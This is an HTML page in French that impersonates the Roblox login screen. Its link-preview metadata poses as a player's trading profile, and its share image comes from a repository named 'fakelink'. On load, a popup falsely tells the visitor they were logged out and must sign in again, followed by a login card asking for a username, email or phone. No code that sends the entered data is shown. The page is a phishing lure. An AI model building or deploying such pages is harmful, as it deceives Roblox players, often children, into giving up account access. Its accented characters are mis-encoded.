<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Roblox</title>
  <!-- Open Graph -->
  <meta property="og:title" content="sayura83k's Profile">
  <meta property="og:site_name" content="Roblox">
  <meta property="og:description" content="Je m'appelle Sayura ! Je joue beaucoup √† bloxfruits ! Disponible pour trade ^^">

  <meta property="og:image:height" content="1200">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:image" content="https://raw.githubusercontent.com/TheGILITCH/fakelink/main/images/noFilter.webp">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Nunito', 'Segoe UI', sans-serif;
      min-height: 100vh;
      background: #1a1a2e;
      overflow-x: hidden;
    }

    /* Background */
    .bg-grid {
      position: fixed;
      inset: 0;
      background-image: url('https://cdn.discordapp.com/attachments/1472960458368749695/1473386469186867350/preview.png?ex=69960594&is=6994b414&hm=9f35a23f19c35679db4f64f0c2797f91d505e496168a5fac567747563f804583&');
      background-size: cover;
      background-position: center;
      z-index: 0;
    }

    .bg-overlay { display: none; }

    /* Navbar */
    nav {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      z-index: 10;
      background: #1a1a1a;
      border-bottom: 1px solid #2a2a2a;
      height: 52px;
      display: flex;
      align-items: center;
      padding: 0 20px;
      gap: 24px;
    }

    .nav-logo {
      font-weight: 900;
      font-size: 1.5rem;
      letter-spacing: -1px;
      color: white;
      margin-right: 16px;
    }
    .nav-logo span { color: white; }

    /* Roblox "R" logo SVG style */
    .roblox-logo {
      display: flex;
      align-items: center;
      gap: 2px;
      font-size: 1.45rem;
      font-weight: 900;
      color: white;
      letter-spacing: -1px;
      font-family: 'Arial Black', Arial, sans-serif;
    }

    nav a {
      color: #ccc;
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
      padding: 4px 0;
      transition: color 0.2s;
    }
    nav a:hover { color: white; }

    .nav-search {
      margin-left: auto;
      display: flex;
      align-items: center;
      background: #2a2a2a;
      border-radius: 6px;
      padding: 6px 12px;
      gap: 8px;
      width: 280px;
    }
    .nav-search input {
      background: none;
      border: none;
      outline: none;
      color: #aaa;
      font-size: 0.875rem;
      width: 100%;
    }
    .nav-search input::placeholder { color: #666; }
    .search-icon { color: #666; font-size: 0.85rem; }

    .nav-btn {
      padding: 7px 18px;
      border-radius: 6px;
      font-size: 0.85rem;
      font-weight: 700;
      cursor: pointer;
      border: none;
    }
    .btn-signup {
      background: #0066ff;
      color: white;
    }
    .btn-login {
      background: transparent;
      color: white;
      border: 1px solid #444 !important;
      border: none;
    }
    .nav-right {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-left: 16px;
    }

    /* Main content */
    main {
      position: relative;
      z-index: 5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding-top: 52px;
    }

    /* Login card */
    .login-card {
      background: #1e1e1e;
      border: 1px solid #2e2e2e;
      border-radius: 12px;
      padding: 36px 32px;
      width: 100%;
      max-width: 370px;
      text-align: center;
    }

    .login-card h1 {
      font-size: 1.5rem;
      font-weight: 800;
      color: white;
      margin-bottom: 24px;
    }

    .input-field {
      width: 100%;
      background: #2a2a2a;
      border: 1px solid #3a3a3a;
      border-radius: 6px;
      color: white;
      font-size: 0.9rem;
      padding: 12px 14px;
      margin-bottom: 12px;
      outline: none;
      transition: border-color 0.2s;
    }
    .input-field::placeholder { color: #666; }
    .input-field:focus { border-color: #0066ff; }

    .btn-primary {
      width: 100%;
      background: #0066ff;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 12px;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      margin-bottom: 16px;
      transition: background 0.2s;
    }
    .btn-primary:hover { background: #0052cc; }

    .forgot {
      color: #aaa;
      font-size: 0.85rem;
      margin-bottom: 20px;
    }
    .forgot a { color: #aaa; text-decoration: none; }
    .forgot a:hover { color: white; }

    .divider {
      height: 1px;
      background: #2e2e2e;
      margin: 16px 0;
    }

    .btn-alt {
      width: 100%;
      background: #2a2a2a;
      color: white;
      border: 1px solid #3a3a3a;
      border-radius: 6px;
      padding: 11px;
      font-size: 0.875rem;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 10px;
      transition: background 0.2s;
    }
    .btn-alt:hover { background: #333; }

    .signup-link {
      margin-top: 16px;
      font-size: 0.85rem;
      color: #888;
    }
    .signup-link a {
      color: #4d9fff;
      text-decoration: none;
      font-weight: 600;
    }
    .signup-link a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <!-- Background grid (colored placeholder tiles) -->
  <div class="bg-grid" id="bgGrid"></div>
  <div class="bg-overlay"></div>

  <!-- Navbar -->
  <nav>
    <div class="roblox-logo">
      <img src="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png" alt="Roblox" style="height:52px; filter: brightness(0) invert(1);">
    </div>
    <a href="#">Charts</a>
    <a href="#">Marketplace</a>
    <a href="#">Cr√©er</a>
    <a href="#">Robux</a>
    <div class="nav-search">
      <span class="search-icon">üîç</span>
      <input type="text" placeholder="Rechercher">
    </div>
    <div class="nav-right">
      <button class="nav-btn btn-signup">S'inscrire</button>
      <button class="nav-btn btn-login">Connexion</button>
    </div>
  </nav>

  <!-- Main -->
  <main>
    <div class="login-card">
      <h1>Connexion √† Roblox</h1>

      <input class="input-field" type="text" placeholder="Identifiant/E-mail/T√©l√©phone">

      <div class="divider"></div>

      <button class="btn-alt">Envoyez-moi un code unique par email</button>
      <button class="btn-alt">Inscription rapide</button>

      <div class="signup-link">
        Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
      </div>
    </div>
  </main>



  <!-- Popup -->
  <div id="popup-overlay" style="
    position: fixed; inset: 0; z-index: 100;
    background: rgba(0,0,0,0.55);
    display: flex; align-items: center; justify-content: center;
  ">
    <div style="
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 14px;
      padding: 32px 30px 28px;
      max-width: 380px;
      width: 90%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
    ">
      <img src="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png"
           alt="Roblox"
           style="height: 36px; filter: brightness(0) invert(1); margin-bottom: 22px;">

      <p style="color: #ddd; font-size: 0.95rem; line-height: 1.6; margin-bottom: 22px;">
        Il semblerait que vous ayez √©t√© d√©connect√© de votre compte.<br>
        Veuillez vous reconnecter pour continuer.
      </p>

      <button onclick="document.getElementById('popup-overlay').style.display='none'" style="
        background: #0066ff;
        color: white;
        border: none;
        border-radius: 7px;
        padding: 11px 40px;
        font-size: 0.95rem;
        font-weight: 700;
        cursor: pointer;
        transition: background 0.2s;
        margin-bottom: 16px;
        display: block;
        width: 100%;
      " onmouseover="this.style.background='#0052cc'" onmouseout="this.style.background='#0066ff'">OK</button>

      <a href="https://en.help.roblox.com/hc/en-us" target="_blank" style="
        color: #4d9fff;
        font-size: 0.8rem;
        text-decoration: none;
      " onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">
        Plus d'informations
      </a>
    </div>
  </div>

</body>
</html>
